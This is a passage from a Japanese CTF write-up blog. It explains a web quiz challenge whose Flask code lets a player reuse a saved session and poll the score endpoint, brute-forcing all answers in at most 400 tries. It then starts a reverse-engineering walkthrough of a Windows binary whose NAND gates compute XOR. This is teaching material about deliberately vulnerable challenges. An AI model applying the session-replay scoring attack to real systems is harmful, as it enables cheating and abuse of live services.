<span class=k>def</span> <span class=nf>api_start</span><span class=p>():</span>
    <span class=k>if</span> <span class=s1>&#39;eid&#39;</span> <span class=ow>in</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>:</span>
        <span class=n>eid</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]</span>
    <span class=k>else</span><span class=p>:</span>
        <span class=n>eid</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>urandom</span><span class=p>(</span><span class=mi>32</span><span class=p>)</span><span class=o>.</span><span class=n>hex</span><span class=p>()</span>

    <span class=c1># Create new challenge set</span>
    <span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>set</span><span class=p>(</span><span class=n>eid</span><span class=p>,</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>([</span><span class=n>new_challenge</span><span class=p>()</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>10</span><span class=p>)]))</span>
    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;ok&#39;</span><span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>/api/start</code>にPOSTリクエストを送ると、ランダムでsession id(<code>eid</code>)を付与し、この番号を使って
redisデータベースに新しい問題を作成します。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/api/question/&lt;int:qid&gt;&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_get_question</span><span class=p>(</span><span class=n>qid</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
    <span class=k>if</span> <span class=n>qid</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=ow>or</span> <span class=n>qid</span> <span class=o>&gt;</span> <span class=mi>10</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid parameter.&#39;</span><span class=p>}</span>
    <span class=k>elif</span> <span class=s1>&#39;eid&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Exam has not started yet.&#39;</span><span class=p>}</span>

    <span class=c1># Send challenge information without answers</span>
    <span class=n>chall</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]))[</span><span class=n>qid</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
    <span class=k>del</span> <span class=n>chall</span><span class=p>[</span><span class=s1>&#39;answers&#39;</span><span class=p>]</span>
    <span class=k>del</span> <span class=n>chall</span><span class=p>[</span><span class=s1>&#39;results&#39;</span><span class=p>]</span>
    <span class=c1># challの情報取ってこれるが, answers, resultsが消えたものが返ってくる</span>
    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;ok&#39;</span><span class=p>,</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=n>chall</span><span class=p>}</span> 
</code></pre></td></tr></table>
</div>
</div><p><code>/api/question/&lt;int:qid></code>に1から10までの番号を指定してGETリクエストを送ると、
指定した大問の問題情報が返ってきます。ただし、答えと結果の情報は消されたものになります。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/api/submit&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_submit</span><span class=p>():</span>
    <span class=k>if</span> <span class=s1>&#39;eid&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Exam has not started yet.&#39;</span><span class=p>}</span>

    <span class=k>try</span><span class=p>:</span>
        <span class=n>answers</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>request</span><span class=o>.</span><span class=n>get_json</span><span class=p>()</span> <span class=c1># ここが入力(二次元のリスト)</span>
    <span class=k>except</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid request. 1&#39;</span><span class=p>}</span>

    <span class=nb>print</span><span class=p>(</span><span class=n>answers</span><span class=p>)</span>
    <span class=c1># Get answers</span>
    <span class=n>eid</span> <span class=o>=</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]</span>
    <span class=n>challs</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>eid</span><span class=p>))</span>
    <span class=k>if</span> <span class=ow>not</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>answers</span><span class=p>,</span> <span class=nb>list</span><span class=p>)</span> \
       <span class=ow>or</span> <span class=nb>len</span><span class=p>(</span><span class=n>answers</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=n>challs</span><span class=p>):</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid request. 2&#39;</span><span class=p>}</span>

    <span class=c1># Check answers</span>
    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>answers</span><span class=p>)):</span>
        <span class=k>if</span> <span class=ow>not</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>answers</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=nb>list</span><span class=p>)</span> \
           <span class=ow>or</span> <span class=nb>len</span><span class=p>(</span><span class=n>answers</span><span class=p>[</span><span class=n>i</span><span class=p>])</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=n>challs</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s1>&#39;answers&#39;</span><span class=p>]):</span>
            <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Invalid request.&#39;</span><span class=p>}</span>

        <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>answers</span><span class=p>[</span><span class=n>i</span><span class=p>])):</span>
            <span class=nb>print</span><span class=p>(</span><span class=nb>type</span><span class=p>(</span><span class=n>challs</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s2>&#34;answers&#34;</span><span class=p>][</span><span class=n>j</span><span class=p>]))</span>
            <span class=n>challs</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s1>&#39;results&#39;</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>=</span> <span class=n>answers</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=o>==</span> <span class=n>challs</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=s1>&#39;answers&#39;</span><span class=p>][</span><span class=n>j</span><span class=p>]</span> <span class=c1># resultsに変更を与えているのはここ</span>

    <span class=c1># Store information with results</span>
    <span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>set</span><span class=p>(</span><span class=n>eid</span><span class=p>,</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>challs</span><span class=p>))</span>
    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;ok&#39;</span><span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>/api/submit</code>でjsonとして10*10のリストをPOSTリクエストにより送ると、このリストとredisに保存された問題情報から答えを比較して結果をchallsのresultsに保存します。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=nd>@app</span><span class=o>.</span><span class=n>route</span><span class=p>(</span><span class=s2>&#34;/api/score&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>])</span>
<span class=k>def</span> <span class=nf>api_score</span><span class=p>():</span>
    <span class=k>if</span> <span class=s1>&#39;eid&#39;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>:</span>
        <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;error&#39;</span><span class=p>,</span> <span class=s1>&#39;reason&#39;</span><span class=p>:</span> <span class=s1>&#39;Exam has not started yet.&#39;</span><span class=p>}</span>

    <span class=c1># Calculate score</span>
    <span class=n>challs</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>db</span><span class=p>()</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=p>[</span><span class=s1>&#39;eid&#39;</span><span class=p>]))</span>
    <span class=n>score</span> <span class=o>=</span> <span class=mi>0</span>
    <span class=k>for</span> <span class=n>chall</span> <span class=ow>in</span> <span class=n>challs</span><span class=p>:</span>
        <span class=k>for</span> <span class=n>result</span> <span class=ow>in</span> <span class=n>chall</span><span class=p>[</span><span class=s1>&#39;results&#39;</span><span class=p>]:</span>
            <span class=k>if</span> <span class=n>result</span> <span class=ow>is</span> <span class=kc>True</span><span class=p>:</span>
                <span class=n>score</span> <span class=o>+=</span> <span class=mi>1</span>

    <span class=c1># Is he/she worth giving the flag?</span>
    <span class=k>if</span> <span class=n>score</span> <span class=o>==</span> <span class=mi>100</span><span class=p>:</span>
        <span class=n>flag</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>getenv</span><span class=p>(</span><span class=s2>&#34;FLAG&#34;</span><span class=p>)</span> <span class=c1># うまいこと100にすればいいのかな</span>
    <span class=k>else</span><span class=p>:</span>
        <span class=n>flag</span> <span class=o>=</span> <span class=s2>&#34;Get perfect score for flag&#34;</span>

    <span class=c1># Prevent reply attack</span>
    <span class=n>flask</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>clear</span><span class=p>()</span>

    <span class=k>return</span> <span class=p>{</span><span class=s1>&#39;status&#39;</span><span class=p>:</span> <span class=s1>&#39;ok&#39;</span><span class=p>,</span> <span class=s1>&#39;data&#39;</span><span class=p>:</span> <span class=p>{</span><span class=s1>&#39;score&#39;</span><span class=p>:</span> <span class=n>score</span><span class=p>,</span> <span class=s1>&#39;flag&#39;</span><span class=p>:</span> <span class=n>flag</span><span class=p>}}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>/api/score</code>にGETリクエストを送ると、redisに保存されたchallsのresultsから正答数を計算し、
スコア情報と、もしも100点ならflagが、そうでなければ"Get perfect score for flag"が返されます。</p>
<p>開催期間中はもしかしたらpythonの等価演算子に何かしらの特性があり、全てのint型のオブジェクトに対して
透過になるようなオブジェクトがあるのかもしれないと思い調べていましたが違ったようです。</p>
<p>まずはじめに、redisデータベースはsession idを用いて各個人の問題情報および結果を管理しています。
すなわち、session idをユーザー側で管理しておけば、何度も回答を変更して答えの確認をすることができます。
次に、問題数は10*10で選択肢は全て4つです。通常、スコアが分からないと、$4^{10\times 10} = 1606938044258990275541962092341162602522202993782792835301376$通りになり総当たりは不可能です。しかし、今回はsession idを自分で管理すれば<code>/api/score</code>によって現在のスコア状況が確認できるため、最悪の場合でも$10\times 10\times 4 = 400$通りで100点を出すことができます。
そのため、<code>/api/start</code>を叩いた時点でsession idを保存しておき、このsessionを用いて1問ずつ<code>/api/submit</code>で回答を変更して<code>/api/score</code>でスコア確認、1点上がったらその問題は正解なので次の問題ということを100回繰り返せば最悪400通りでflagを得ることができます。</p>
<p>今まで考えていませんでしたがTOEICは200問出題されるため、
回答の組み合わせは$4^{200}$通りもあります。この総当たりの個数を知っていたところでTOEICは回答の再提出と試験中のスコア確認ができないため、結局試験は一発勝負です。（そもそもTOEICのスコアは受験者全員のスコアが分かっていないと計算できない）</p>
<h2 id=rev>rev</h2>
<h3 id=nande-warmup-rev>nande [warmup, rev]</h3>
<p>渡されるファイルは、<code>nand.exe</code>と<code>nand.pdb</code>です。<code>.pdb</code>はソースコードのファイル名、シンボルなどのプログラムのデバッグ時に使用されるファイルです。<code>nand.exe</code>は次のようなファイル形式でした。拡張子の通りPEファイルです。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>nand.exe: PE32+ executable (console) x86-64, for MS Windows
</code></pre></td></tr></table>
</div>
</div><p>Ghidraで静的解析します。まず、<code>main</code>関数です。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>int</span> <span class=kr>__cdecl</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>_Argc</span><span class=p>,</span><span class=kt>char</span> <span class=o>**</span><span class=n>_Argv</span><span class=p>,</span><span class=kt>char</span> <span class=o>**</span><span class=n>_Env</span><span class=p>)</span>

<span class=p>{</span>
  <span class=kt>char</span> <span class=o>*</span><span class=n>_Str</span><span class=p>;</span>
  <span class=kt>bool</span> <span class=n>bVar1</span><span class=p>;</span>
  <span class=n>size_t</span> <span class=n>sVar2</span><span class=p>;</span>
  <span class=n>ulonglong</span> <span class=n>local_30</span><span class=p>;</span>
  <span class=n>ulonglong</span> <span class=n>local_28</span><span class=p>;</span>
  <span class=n>ulonglong</span> <span class=n>local_20</span><span class=p>;</span>
  
  <span class=k>if</span> <span class=p>(</span><span class=n>_Argc</span> <span class=o>&lt;</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
    <span class=n>printf</span><span class=p>(</span><span class=nl>s_Usage</span><span class=p>:</span><span class=n>_</span><span class=o>%</span><span class=n>s_</span><span class=o>&lt;</span><span class=n>flag</span><span class=o>&gt;</span><span class=n>_14001e100</span><span class=p>,</span><span class=o>*</span><span class=n>_Argv</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>else</span> <span class=p>{</span>
    <span class=n>_Str</span> <span class=o>=</span> <span class=n>_Argv</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
    <span class=n>sVar2</span> <span class=o>=</span> <span class=n>strlen</span><span class=p>(</span><span class=n>_Str</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=n>sVar2</span> <span class=o>==</span> <span class=mh>0x20</span><span class=p>)</span> <span class=p>{</span>
      <span class=k>for</span> <span class=p>(</span><span class=n>local_28</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_28</span> <span class=o>&lt;</span> <span class=mh>0x20</span><span class=p>;</span> <span class=n>local_28</span> <span class=o>=</span> <span class=n>local_28</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>for</span> <span class=p>(</span><span class=n>local_30</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_30</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>;</span> <span class=n>local_30</span> <span class=o>=</span> <span class=n>local_30</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
          <span class=n>InputSequence</span><span class=p>[</span><span class=n>local_30</span> <span class=o>+</span> <span class=n>local_28</span> <span class=o>*</span> <span class=mi>8</span><span class=p>]</span> <span class=o>=</span>
               <span class=p>(</span><span class=n>byte</span><span class=p>)((</span><span class=kt>int</span><span class=p>)</span><span class=n>_Str</span><span class=p>[</span><span class=n>local_28</span><span class=p>]</span> <span class=o>&gt;&gt;</span> <span class=p>((</span><span class=n>byte</span><span class=p>)</span><span class=n>local_30</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>))</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>;</span>
        <span class=p>}</span>
      <span class=p>}</span>
      <span class=n>CIRCUIT</span><span class=p>(</span><span class=n>InputSequence</span><span class=p>,</span><span class=n>OutputSequence</span><span class=p>);</span>
      <span class=n>bVar1</span> <span class=o>=</span> <span class=nb>true</span><span class=p>;</span>
      <span class=k>for</span> <span class=p>(</span><span class=n>local_20</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_20</span> <span class=o>&lt;</span> <span class=mh>0x100</span><span class=p>;</span> <span class=n>local_20</span> <span class=o>=</span> <span class=n>local_20</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
        <span class=n>bVar1</span> <span class=o>=</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)(</span><span class=n>bVar1</span> <span class=o>&amp;</span> <span class=n>OutputSequence</span><span class=p>[</span><span class=n>local_20</span><span class=p>]</span> <span class=o>==</span> <span class=n>AnswerSequence</span><span class=p>[</span><span class=n>local_20</span><span class=p>]);</span>
      <span class=p>}</span>
      <span class=k>if</span> <span class=p>(</span><span class=n>bVar1</span><span class=p>)</span> <span class=p>{</span>
        <span class=n>puts</span><span class=p>(</span><span class=n>s_Correct</span><span class=o>!</span><span class=n>_14001e118</span><span class=p>);</span>
        <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
      <span class=p>}</span>
    <span class=p>}</span>
    <span class=n>puts</span><span class=p>(</span><span class=n>s_Wrong</span><span class=p>...</span><span class=n>_14001e128</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>ここから次のようなことが分かります。</p>
<ul>
<li>コマンドライン引数に入力した文字列(<code>_Argv[1]</code>)の長さが0x20=32</li>
<li>入力した文字列をリトルエンディアンでバイナリに展開して<code>InputSequence</code>に格納</li>
<li><code>CIRCUIT</code>関数に<code>InputSequence</code>を入力して、<code>OutputSequence</code>に出力している</li>
<li><code>OutputSequence</code>と<code>AnswerSequence</code>を比較して全部一致していたら、入力した文字列がflag</li>
</ul>
<p>さて、ここで実際に重要な処理を行っている箇所は<code>CIRCUIT</code>関数であることが分かるので、<code>CICRUIT</code>関数を見てみます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=kr>__cdecl</span> <span class=nf>CIRCUIT</span><span class=p>(</span><span class=n>uchar</span> <span class=o>*</span><span class=n>param_1</span><span class=p>,</span><span class=n>uchar</span> <span class=o>*</span><span class=n>param_2</span><span class=p>)</span>

<span class=p>{</span>
  <span class=n>ulonglong</span> <span class=n>local_28</span><span class=p>;</span>
  <span class=n>ulonglong</span> <span class=n>i</span><span class=p>;</span>
  
  <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mh>0x1234</span><span class=p>;</span> <span class=n>i</span> <span class=o>=</span> <span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>for</span> <span class=p>(</span><span class=n>local_28</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>local_28</span> <span class=o>&lt;</span> <span class=mh>0xff</span><span class=p>;</span> <span class=n>local_28</span> <span class=o>=</span> <span class=n>local_28</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
      <span class=n>MODULE</span><span class=p>(</span><span class=n>param_1</span><span class=p>[</span><span class=n>local_28</span><span class=p>],</span><span class=n>param_1</span><span class=p>[</span><span class=n>local_28</span> <span class=o>+</span> <span class=mi>1</span><span class=p>],</span><span class=n>param_2</span> <span class=o>+</span> <span class=n>local_28</span><span class=p>);</span>
    <span class=p>}</span>
    <span class=n>MODULE</span><span class=p>(</span><span class=n>param_1</span><span class=p>[</span><span class=n>local_28</span><span class=p>],</span><span class=sc>&#39;\x01&#39;</span><span class=p>,</span><span class=n>param_2</span> <span class=o>+</span> <span class=n>local_28</span><span class=p>);</span>
    <span class=n>memcpy</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=n>param_2</span><span class=p>,</span><span class=mh>0x100</span><span class=p>);</span>
  <span class=p>}</span>
  <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p><code>MODULE</code>関数を0x1234回だけ繰り返し呼び出しています。<code>MODULE</code>関数も見てみます。</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>void</span> <span class=kr>__cdecl</span> <span class=nf>MODULE</span><span class=p>(</span><span class=n>uchar</span> <span class=n>param_1</span><span class=p>,</span><span class=n>uchar</span> <span class=n>param_2</span><span class=p>,</span><span class=n>uchar</span> <span class=o>*</span><span class=n>param_3</span><span class=p>)</span>

<span class=p>{</span>
  <span class=n>undefined</span> <span class=n>auStack_38</span> <span class=p>[</span><span class=mi>32</span><span class=p>];</span>
  <span class=n>uchar</span> <span class=n>local_18</span><span class=p>;</span>
  <span class=n>uchar</span> <span class=n>local_17</span><span class=p>;</span>
  <span class=n>uchar</span> <span class=n>local_16</span> <span class=p>[</span><span class=mi>6</span><span class=p>];</span>
  <span class=n>ulonglong</span> <span class=n>local_10</span><span class=p>;</span>
  
  <span class=n>local_10</span> <span class=o>=</span> <span class=n>__security_cookie</span> <span class=o>^</span> <span class=p>(</span><span class=n>ulonglong</span><span class=p>)</span><span class=n>auStack_38</span><span class=p>;</span>
  <span class=n>NAND</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=n>param_2</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_18</span><span class=p>);</span>
  <span class=n>NAND</span><span class=p>(</span><span class=n>param_1</span><span class=p>,</span><span class=n>local_18</span><span class=p>,</span><span class=n>local_16</span><span class=p>);</span>
  <span class=n>NAND</span><span class=p>(</span><span class=n>param_2</span><span class=p>,</span><span class=n>local_18</span><span class=p>,</span><span class=o>&amp;</span><span class=n>local_17</span><span class=p>);</span>
  <span class=n>NAND</span><span class=p>(</span><span class=n>local_16</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>local_17</span><span class=p>,</span><span class=n>param_3</span><span class=p>);</span>
  <span class=n>__security_check_cookie</span><span class=p>(</span><span class=n>local_10</span> <span class=o>^</span> <span class=p>(</span><span class=n>ulonglong</span><span class=p>)</span><span class=n>auStack_38</span><span class=p>);</span>
  <span class=k>return</span><span class=p>;</span>
<span class=p>}</span>
</code></pre></td></tr></table>
</div>
</div><p>NANDを4回だけ呼び出してます。これを数式と回路図に落とし込んでみます。
<img src=https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit.png width=672 height=221 srcset="https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit_hu2d39ee020d3ce23cf486f494d30c6a22_26649_480x0_resize_box_3.png 480w, https://hiro-1219.github.io/blog/p/cakectf2023-writeup/img/xor_circuit_hu2d39ee020d3ce23cf486f494d30c6a22_26649_1024x0_resize_box_3.png 1024w" loading=lazy alt="MODULE内部 回路図" class=gallery-image data-flex-grow=304 data-flex-basis=729px>
数式は次の通りです。（記号は上記の図に合わせています）
$$
\begin{align}
c &= \overline{\{\overline{(\overline{a\cdot b}) \cdot a}\}\cdot \{\overline{(\overline{a\cdot b}) \cdot b}\}} \nonumber \\
&= \{(\overline{a\cdot b})\cdot a\} + \{(\overline{a\cdot b})\cdot b\} \nonumber \\
&= \{(\overline{a} + \overline{b}) \cdot a\} + \{(\overline{a} + \overline{b}) \cdot b\} \nonumber \\
&= \overline{a}\cdot a + a\cdot \overline{b} + \overline{a}\cdot b + \overline{b}\cdot b \nonumber \\
&= a\cdot \overline{b} + \overline{a}\cdot b \nonumber \\
&= a \oplus b
\end{align}
$$
式(1)より<code>MODULE</code>関数の数式を展開していくと、xor演算をしていることが分かります。
